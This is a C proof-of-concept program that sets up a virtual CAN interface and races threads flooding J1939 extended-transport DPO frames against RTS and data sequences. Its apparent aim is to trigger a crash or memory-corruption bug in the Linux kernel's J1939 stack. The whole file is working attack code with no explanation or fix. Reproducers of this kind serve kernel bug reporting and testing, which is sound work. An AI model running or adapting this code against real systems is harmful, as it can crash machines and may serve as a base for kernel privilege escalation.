// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <net/if.h>
#include <linux/sockios.h>
#include <linux/can.h>
#include <linux/can/raw.h>
#include <linux/can/j1939.h>
#include <linux/rtnetlink.h>
#include <linux/netlink.h>
#include <linux/if_link.h>

#define J1939_ETP_PGN_CTL  0xc800u
#define J1939_ETP_PGN_DAT  0xc700u
#define J1939_ETP_CMD_RTS  0x14
#define J1939_ETP_CMD_CTS  0x15
#define J1939_ETP_CMD_DPO  0x16
#define J1939_ETP_CMD_EOMA 0x17

#define LOCAL_ADDR  0x80
#define REMOTE_ADDR 0x42

#define INNER_PGN   0x0f000u
#define MSG_TOTAL   1792

static int can_ifindex = 0;
static volatile int stop_attack = 0;

static int nl_send(int fd, struct nlmsghdr *nh)
{
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    struct iovec iov = { .iov_base = nh, .iov_len = nh->nlmsg_len };
    struct msghdr msg = {
        .msg_name = &sa, .msg_namelen = sizeof(sa),
        .msg_iov = &iov, .msg_iovlen = 1,
    };
    return sendmsg(fd, &msg, 0);
}

static int nl_recv_ack(int fd)
{
    char buf[4096];
    struct iovec iov = { .iov_base = buf, .iov_len = sizeof(buf) };
    struct sockaddr_nl sa;
    struct msghdr msg = {
        .msg_name = &sa, .msg_namelen = sizeof(sa),
        .msg_iov = &iov, .msg_iovlen = 1,
    };
    int n = recvmsg(fd, &msg, 0);
    if (n < 0) return -1;
    struct nlmsghdr *nh = (struct nlmsghdr *)buf;
    for (; NLMSG_OK(nh, n); nh = NLMSG_NEXT(nh, n)) {
        if (nh->nlmsg_type == NLMSG_ERROR) {
            struct nlmsgerr *e = NLMSG_DATA(nh);
            return e->error;
        }
    }
    return 0;
}

static void rta_add(struct nlmsghdr *nh, int max, int type,
                    const void *data, int len)
{
    int rta_len = RTA_LENGTH(len);
    struct rtattr *rta = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = rta_len;
    if (data && len) memcpy(RTA_DATA(rta), data, len);
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(rta_len);
}

static struct rtattr *rta_nest(struct nlmsghdr *nh, int type)
{
    struct rtattr *rta = (struct rtattr *)((char *)nh + NLMSG_ALIGN(nh->nlmsg_len));
    rta->rta_type = type | NLA_F_NESTED;
    rta->rta_len = RTA_LENGTH(0);
    nh->nlmsg_len = NLMSG_ALIGN(nh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
    return rta;
}

static void rta_nest_end(struct nlmsghdr *nh, struct rtattr *rta)
{
    rta->rta_len = (char *)nh + nh->nlmsg_len - (char *)rta;
}

static int create_vcan(const char *name)
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) { perror("netlink socket"); return -1; }

    char buf[1024];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nh = (struct nlmsghdr *)buf;
    struct ifinfomsg *ifm;

    nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*ifm));
    nh->nlmsg_type  = RTM_NEWLINK;
    nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
    nh->nlmsg_seq   = 1;
    ifm = NLMSG_DATA(nh);
    ifm->ifi_family = AF_UNSPEC;

    rta_add(nh, sizeof(buf), IFLA_IFNAME, name, strlen(name) + 1);

    struct rtattr *linfo = rta_nest(nh, IFLA_LINKINFO);
    rta_add(nh, sizeof(buf), IFLA_INFO_KIND, "vcan", 5);
    rta_nest_end(nh, linfo);

    if (nl_send(fd, nh) < 0) { perror("nl_send NEWLINK"); close(fd); return -1; }
    int err = nl_recv_ack(fd);
    if (err && err != -EEXIST) {
        fprintf(stderr, "vcan create err=%d\n", err);
        close(fd); return -1;
    }
    close(fd);
    return 0;
}

static int set_link_up(const char *name)
{
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0) return -1;

    int idx = if_nametoindex(name);
    if (!idx) { close(fd); return -1; }

    char buf[256];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *nh = (struct nlmsghdr *)buf;
    struct ifinfomsg *ifm;

    nh->nlmsg_len   = NLMSG_LENGTH(sizeof(*ifm));
    nh->nlmsg_type  = RTM_NEWLINK;
    nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nh->nlmsg_seq   = 2;
    ifm = NLMSG_DATA(nh);
    ifm->ifi_family = AF_UNSPEC;
    ifm->ifi_index  = idx;
    ifm->ifi_change = IFF_UP;
    ifm->ifi_flags  = IFF_UP;

    if (nl_send(fd, nh) < 0) { close(fd); return -1; }
    int err = nl_recv_ack(fd);
    close(fd);
    return err;
}

static uint32_t make_canid_pdu1(uint32_t pgn , uint8_t da, uint8_t sa)
{

    uint32_t pri = 6;
    return CAN_EFF_FLAG | (pri << 26) | ((pgn & 0x3ff00) << 8) | ((uint32_t)da << 8) | sa;
}

static uint32_t make_canid_pdu2(uint32_t pgn, uint8_t sa)
{
    uint32_t pri = 6;
    return CAN_EFF_FLAG | (pri << 26) | ((pgn & 0x3ffff) << 8) | sa;
}

static int send_etp_ctl(int rsk, uint8_t cmd, uint32_t inner_pgn,
                        uint8_t b1, uint8_t b2, uint8_t b3, uint8_t b4,
                        uint8_t da, uint8_t sa)
{
    struct can_frame f;
    memset(&f, 0, sizeof(f));
    f.can_id = make_canid_pdu1(J1939_ETP_PGN_CTL, da, sa);
    f.len = 8;
    f.data[0] = cmd;
    f.data[1] = b1;
    f.data[2] = b2;
    f.data[3] = b3;
    f.data[4] = b4;

    f.data[5] = (inner_pgn >> 0) & 0xff;
    f.data[6] = (inner_pgn >> 8) & 0xff;
    f.data[7] = (inner_pgn >> 16) & 0xff;
    return write(rsk, &f, sizeof(f));
}

static int send_etp_dat(int rsk, uint8_t seq, const uint8_t data7[7],
                        uint8_t da, uint8_t sa)
{
    struct can_frame f;
    memset(&f, 0, sizeof(f));
    f.can_id = make_canid_pdu1(J1939_ETP_PGN_DAT, da, sa);
    f.len = 8;
    f.data[0] = seq;
    if (data7) memcpy(&f.data[1], data7, 7);
    return write(rsk, &f, sizeof(f));
}

struct attack_ctx {
    int rsk;
    uint32_t inner_pgn;
    uint8_t da, sa;
    int cpu;
};

static void *dpo_attack_thread(void *arg)
{
    struct attack_ctx *ctx = arg;

    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(ctx->cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    while (1) {
        if (stop_attack) {

            for (volatile int i = 0; i < 50; i++);
            continue;
        }

        send_etp_ctl(ctx->rsk, J1939_ETP_CMD_DPO, ctx->inner_pgn,
                     0xff, 0xff, 0xff, 0x7f,
                     ctx->da, ctx->sa);
    }
    return NULL;
}

int main(int argc, char **argv)
{

    if (create_vcan("vcan0") < 0) {
        fprintf(stderr, "create_vcan failed\n");
        return 1;
    }
    if (set_link_up("vcan0") < 0) {
        fprintf(stderr, "set_link_up failed\n");
        return 1;
    }
    can_ifindex = if_nametoindex("vcan0");
    if (!can_ifindex) { fprintf(stderr, "no vcan0\n"); return 1; }
    printf("[+] vcan0 ifindex=%d\n", can_ifindex);

    int jsk = socket(PF_CAN, SOCK_DGRAM, CAN_J1939);
    if (jsk < 0) { perror("socket J1939"); return 1; }

    struct sockaddr_can jaddr;
    memset(&jaddr, 0, sizeof(jaddr));
    jaddr.can_family = AF_CAN;
    jaddr.can_ifindex = can_ifindex;
    jaddr.can_addr.j1939.name = J1939_NO_NAME;
    jaddr.can_addr.j1939.addr = LOCAL_ADDR;
    jaddr.can_addr.j1939.pgn  = J1939_NO_PGN;
    if (bind(jsk, (struct sockaddr *)&jaddr, sizeof(jaddr)) < 0) {
        perror("bind J1939");
        return 1;
    }
    printf("[+] J1939 socket bound at addr=0x%x\n", LOCAL_ADDR);

    int rsk = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    if (rsk < 0) { perror("socket CAN_RAW"); return 1; }

    int loopback = 1;
    setsockopt(rsk, SOL_CAN_RAW, CAN_RAW_LOOPBACK, &loopback, sizeof(loopback));

    struct sockaddr_can raddr;
    memset(&raddr, 0, sizeof(raddr));
    raddr.can_family = AF_CAN;
    raddr.can_ifindex = can_ifindex;
    if (bind(rsk, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
        perror("bind raw CAN");
        return 1;
    }
    printf("[+] raw CAN socket on vcan0\n");

    cpu_set_t cs;
    CPU_ZERO(&cs);
    CPU_SET(0, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);

    int n_attackers = 3;
    pthread_t tids[3];
    struct attack_ctx acs[3];
    for (int i = 0; i < n_attackers; i++) {
        int afd = socket(PF_CAN, SOCK_RAW, CAN_RAW);
        if (afd < 0) { perror("socket attacker"); return 1; }
        setsockopt(afd, SOL_CAN_RAW, CAN_RAW_LOOPBACK, &loopback,
                   sizeof(loopback));
        if (bind(afd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
            perror("bind attacker"); return 1;
        }
        acs[i].rsk = afd;
        acs[i].inner_pgn = INNER_PGN;
        acs[i].da = LOCAL_ADDR;
        acs[i].sa = REMOTE_ADDR;
        acs[i].cpu = 1 + i;
        pthread_create(&tids[i], NULL, dpo_attack_thread, &acs[i]);
    }

    int max_iters = 50;
    int iter;
    uint8_t dummy[7] = { 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, 0x11 };
    for (iter = 0; iter < max_iters; iter++) {
        if ((iter & 0x7) == 0) printf("[*] iter %d\n", iter);

        stop_attack = 1;

        if (iter > 0)
            usleep(150000);

        uint32_t size = MSG_TOTAL;
        send_etp_ctl(rsk, J1939_ETP_CMD_RTS, INNER_PGN,
                     size & 0xff, (size >> 8) & 0xff,
                     (size >> 16) & 0xff, (size >> 24) & 0xff,
                     LOCAL_ADDR, REMOTE_ADDR);

        usleep(20000);

        send_etp_ctl(rsk, J1939_ETP_CMD_DPO, INNER_PGN,
                     0, 0, 0, 0,
                     LOCAL_ADDR, REMOTE_ADDR);
        usleep(2000);

        for (int i = 1; i <= 255; i++) {
            send_etp_dat(rsk, (uint8_t)i, dummy, LOCAL_ADDR, REMOTE_ADDR);
            if ((i & 0xf) == 0) usleep(200);
        }

        usleep(20000);

        send_etp_ctl(rsk, J1939_ETP_CMD_DPO, INNER_PGN,
                     0xff, 0xff, 0, 0,
                     LOCAL_ADDR, REMOTE_ADDR);
        usleep(2000);

        send_etp_dat(rsk, 1, dummy, LOCAL_ADDR, REMOTE_ADDR);

        stop_attack = 0;

        usleep(50000);

        stop_attack = 1;
    }

    stop_attack = 1;

    for (int i = 0; i < n_attackers; i++) pthread_cancel(tids[i]);
    for (int i = 0; i < n_attackers; i++) pthread_join(tids[i], NULL);
    printf("[-] no crash after %d iterations\n", max_iters);
    return 0;
}
